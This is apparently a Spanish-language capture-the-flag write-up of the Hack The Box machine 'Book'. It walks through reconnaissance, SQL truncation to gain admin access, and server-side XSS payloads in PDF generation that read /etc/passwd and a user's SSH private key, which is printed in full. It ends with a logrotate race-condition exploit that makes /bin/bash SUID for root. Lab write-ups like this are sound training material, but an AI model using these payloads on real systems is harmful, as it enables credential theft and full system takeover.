---
title: "Book"
date: 2024-08-14
draft: false
description: "Resoluciones de máquinas"
tags: ["Writeup", "HTB","Medium","Book"]
---

## Reconocimiento
### Nmap

Escaneamos la maquina para ver que puertos tiene abiertos:

```shell
nmap -p- --open --min-rate 5000 -Pn -n 10.10.10.176
```

>Nota:

>

>**-p-**: El guion después de `-p` indica a `nmap` que debe escanear todos los puertos desde el 1 hasta el 65535

>

>**--open**: Filtra los resultados para mostrar solo los puertos abiertos, ignorando los puertos cerrados y filtrados

>

>**-sS**: El escaneo SYN es un tipo de escaneo que envía paquetes SYN y analiza las respuestas para determinar el estado de los puertos

>

>**--min-rate 5000**: Configura `nmap` para enviar al menos 5000 paquetes por segundo, acelerando el escaneo

>

>**-Pn**: Omite la etapa de ping para determinar si un host está activo, asumiendo que todos los hosts están activos. Esto es útil para escanear hosts que pueden estar configurados para no responder a pings

>

>**-n**: Evita la resolución de nombres DNS, acelerando el escaneo ya que no se espera a que se resuelvan los nombres de los hosts

```
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

### Gobuster

Uso gobuster para hacer fuzzing para ver posibles directorios o archivos ocultos:

```
gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://10.10.10.176 -t 200 -x php
```

```
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.php                 (Status: 403) [Size: 277]
/profile.php          (Status: 302) [Size: 0] [--> index.php]
/docs                 (Status: 301) [Size: 311] [--> http://10.10.10.176/docs/]
/search.php           (Status: 302) [Size: 0] [--> index.php]
/home.php             (Status: 302) [Size: 0] [--> index.php]
/images               (Status: 301) [Size: 313] [--> http://10.10.10.176/images/]
/download.php         (Status: 302) [Size: 0] [--> index.php]
/contact.php          (Status: 302) [Size: 0] [--> index.php]
/admin                (Status: 301) [Size: 312] [--> http://10.10.10.176/admin/]
/db.php               (Status: 200) [Size: 0]
/logout.php           (Status: 302) [Size: 0] [--> index.php]
/collections.php      (Status: 302) [Size: 0] [--> index.php]
/settings.php         (Status: 302) [Size: 0] [--> index.php]
/index.php            (Status: 200) [Size: 6800]
/books.php            (Status: 302) [Size: 0] [--> index.php]
/feedback.php         (Status: 302) [Size: 0] [--> index.php]
/.php                 (Status: 403) [Size: 277]
/server-status        (Status: 403) [Size: 277]
Progress: 441120 / 441122 (100.00%)
===============================================================
Finished
===============================================================
```

## Intrusión

En la web vemos que necesitamos crearnos una cuenta:

![](img/create.png)

Creamos la cuenta y vemos una página con varias cosas:

![](img/web.png)

En el apartado de `Contact Us` podemos enviar un mensaje al correo del admin, esto es muy interesante ya que podemos intentar un `XSS` para robarle la cookie de sesión o mirar si le mandamos enlaces que esté programado para clicar en ellos:

![](img/xss.png)

Pero esto no nos manda ninguna petición ni nada.

### SQL Truncation

Mirando mas a fondo la web vemos que podemos cambiar nuestro nombre pero nos lo capa a un limite de caracteres:

![](img/cambio1.png)

Le damos a update

![](img/cambio2.png)


Esto nos da una pista que se puede acontecer un `SQL Truncation`

>Que es?
>Es una vulnerabilidad donde, debido a un límite de longitud en una columna de la base de datos, se trunca el valor ingresado. Esto puede ser explotado para cambiar o bypass ciertos controles. Por ejemplo, si intentas crear un usuario con un nombre muy largo, el sistema podría truncarlo, permitiendo que alguien cree una cuenta con un nombre similar al de un usuario existente y, potencialmente, acceder a sus privilegios.

Vamos a ver si funciona para crear otro usuario admin con la contraseña que pongamos nosotros

Para esto vamos a interceptar la petición con `burpsuite` y así la podemos modificar

![](img/burp.png)

Después de varias pruebas veo que el limite son 20 caracteres y ahora cuando lo mando se crea el usuario, vamos a ver si tenemos acceso al panel administrador que he visto en el `gobuster`:

![](img/admin.png)

Ya estamos como admin e la web

### Ganar acceso

En el panel de admin dentro de `collections.php` podemos descargar los pdf de los libros subidos y en la web podíamos subir pdf:

![](img/subir.png)

Al subir un pdf lo podemos ver aquí:

![](img/collection.png)

![](img/collection2.png)

Vemos que se genera el pdf con el input de `Book Title` y `Author` que hemos puesto, por lo que se genera un pdf dinámico, podemos probar a usar esos campos vara ver archivos del sistema con este script de [HackTricks](img/https://book.hacktricks.xyz/pentesting-web/xss-cross-site-scripting/server-side-xss-dynamic-pdf):

```js
<script>
x=new XMLHttpRequest;
x.onload=function(){document.write(this.responseText)};
x.open("GET","file:///etc/passwd");x.send();
</script>
```

![](img/etc.png)

Hemos visto que esta el `ssh` abierto por lo que vamos a intentar mirar la clave `id_rsa` del usuario `reader`:

![](img/ssh1.png)

Lo podemos leer pero se corta al final de cada linea y no lo podemos copiar, vamos a solucionarlo con etiquetas de pre-formateo: 

Añadiendo la etiqueta `"<pre>"` antes y después de `this.responseText`

```js
<script>
x=new XMLHttpRequest;
x.onload=function(){document.write("<pre>"+this.responseText+"</pre>")};
x.open("GET","file:///home/reader/.ssh/id_rsa");x.send();
</script>
```

Ahora si: 

```
-----BEGIN RSA PRIVATE KEY-----  
MIIEpQIBAAKCAQEA2JJQsccK6fE05OWbVGOuKZdf0FyicoUrrm821nHygmLgWSpJ  
G8m6UNZyRGj77eeYGe/7YIQYPATNLSOpQIue3knhDiEsfR99rMg7FRnVCpiHPpJ0  
WxtCK0VlQUwxZ6953D16uxlRH8LXeI6BNAIjF0Z7zgkzRhTYJpKs6M80NdjUCl/0  
ePV8RKoYVWuVRb4nFG1Es0bOj29lu64yWd/j3xWXHgpaJciHKxeNlr8x6NgbPv4s  
7WaZQ4cjd+yzpOCJw9J91Vi33gv6+KCIzr+TEfzI82+hLW1UGx/13fh20cZXA6PK  
75I5d5Holg7ME40BU06Eq0E3EOY6whCPlzndVwIDAQABAoIBAQCs+kh7hihAbIi7  
3mxvPeKok6BSsvqJD7aw72FUbNSusbzRWwXjrP8ke/Pukg/OmDETXmtgToFwxsD+  
McKIrDvq/gVEnNiE47ckXxVZqDVR7jvvjVhkQGRcXWQfgHThhPWHJI+3iuQRwzUI  
tIGcAaz3dTODgDO04Qc33+U9WeowqpOaqg9rWn00vgzOIjDgeGnbzr9ERdiuX6WJ  
jhPHFI7usIxmgX8Q2/nx3LSUNeZ2vHK5PMxiyJSQLiCbTBI/DurhMelbFX50/owz  
7Qd2hMSr7qJVdfCQjkmE3x/L37YQEnQph6lcPzvVGOEGQzkuu4ljFkYz6sZ8GMx6  
GZYD7sW5AoGBAO89fhOZC8osdYwOAISAk1vjmW9ZSPLYsmTmk3A7jOwke0o8/4FL  
E2vk2W5a9R6N5bEb9yvSt378snyrZGWpaIOWJADu+9xpZScZZ9imHHZiPlSNbc8/  
ciqzwDZfSg5QLoe8CV/7sL2nKBRYBQVL6D8SBRPTIR+J/wHRtKt5PkxjAoGBAOe+  
SRM/Abh5xub6zThrkIRnFgcYEf5CmVJX9IgPnwgWPHGcwUjKEH5pwpei6Sv8et7l  
skGl3dh4M/2Tgl/gYPwUKI4ori5OMRWykGANbLAt+Diz9mA3FQIi26ickgD2fv+V  
o5GVjWTOlfEj74k8hC6GjzWHna0pSlBEiAEF6Xt9AoGAZCDjdIZYhdxHsj9l/g7m  
Hc5LOGww+NqzB0HtsUprN6YpJ7AR6+YlEcItMl/FOW2AFbkzoNbHT9GpTj5ZfacC  
hBhBp1ZeeShvWobqjKUxQmbp2W975wKR4MdsihUlpInwf4S2k8J+fVHJl4IjT80u  
Pb9n+p0hvtZ9sSA4so/DACsCgYEA1y1ERO6X9mZ8XTQ7IUwfIBFnzqZ27pOAMYkh  
sMRwcd3TudpHTgLxVa91076cqw8AN78nyPTuDHVwMN+qisOYyfcdwQHc2XoY8YCf  
tdBBP0Uv2dafya7bfuRG+USH/QTj3wVen2sxoox/hSxM2iyqv1iJ2LZXndVc/zLi  
5bBLnzECgYEAlLiYGzP92qdmlKLLWS7nPM0YzhbN9q0qC3ztk/+1v8pjj162pnlW  
y1K/LbqIV3C01ruxVBOV7ivUYrRkxR/u5QbS3WxOnK0FYjlS7UUAc4r0zMfWT9TN  
nkeaf9obYKsrORVuKKVNFzrWeXcVx+oG3NisSABIprhDfKUSbHzLIR4=  
-----END RSA PRIVATE KEY-----
```

```
reader@book:~$ whoami
reader
```

## Escalada de Privilegios

Usaremos `pspy` para enumerar las tareas cron:

Vemos que `root`ejecuta un binario llamado `logrotate`, al buscar en google vemos que se puede explotar para escalar de privilegios:

[Logrotate Privilage Escalation](img/https://packetstormsecurity.com/files/154743/Logrotate-3.15.1-Privilege-Escalation.html)

Consiste en una race condition, tenemos que crear un archivo con el payload que queremos que ejecute cuando se haga la race condition y luego compilar el programa que viene abajo:

`payloadfile`:

```bash
#!/bin/bash
chmod u+s /bin/bash
```

```
gcc logrotate.c -o logrotate
```

```
./logrotate -p payloadfile ./access.log
```

Ahora en otra terminal entramos al mismo usuario y modificamos algo en el `access.log` para que se produzca la condición:

```
echo a > access.log
```

La bash ya tiene permisos suid

```
reader@book:~/backups$ ls -l /bin/bash
-rwsr-xr-x 1 root root 1113504 Apr  4  2018 /bin/bash
reader@book:~/backups$ bash -p
bash-4.4# whoami
root
```

Ya somos root!
